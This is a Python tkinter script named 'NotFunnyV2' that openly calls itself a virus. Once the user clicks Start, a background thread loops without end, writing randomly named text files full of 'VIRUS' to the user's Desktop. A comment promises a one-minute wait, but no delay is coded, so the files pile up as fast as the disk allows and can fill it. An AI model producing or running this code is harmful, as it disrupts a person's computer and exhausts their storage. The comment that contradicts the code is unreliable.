import tkinter as tk
from tkinter import messagebox
import os
import random
import string
import time
import threading

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def create_random_text_file():
    try:
        # Get the path to the current user's desktop
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        
        # Generate a random filename
        random_name = generate_random_string(8) + ".txt"
        
        # Construct the full path for the new file
        file_path = os.path.join(desktop_path, random_name)
        
        # Write some content to the file
        with open(file_path, 'w') as f:
            f.write("VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS VIRUS ")
        
        print(f"Created file '{random_name}' on desktop at {time.ctime()}")

    except Exception as e:
        print(f"Error creating file: {e}")

def start_script():
    messagebox.showinfo("VIRUS IS STARTING", "PRESS OK OR CLOSE THIS WINDOW TO START.")
    start_button.config(state=tk.DISABLED)
    
    def run_script():
        while True:
            create_random_text_file()
              # Wait for 1 minute
    
    script_thread = threading.Thread(target=run_script)
    script_thread.start()

# Create GUI window
root = tk.Tk()
root.title("NotFunnyV2")

# Create a label
label = tk.Label(root, text="THIS FILE IS DANGEROUS IF YOU CLICK START THERE IS NO GOING BACK!!! START IT AT YOUR OWN RISK!!!")
label.pack(pady=20)

# Create a start button
start_button = tk.Button(root, text="Start", command=start_script)
start_button.pack(pady=10)

# Run the GUI event loop
root.mainloop()
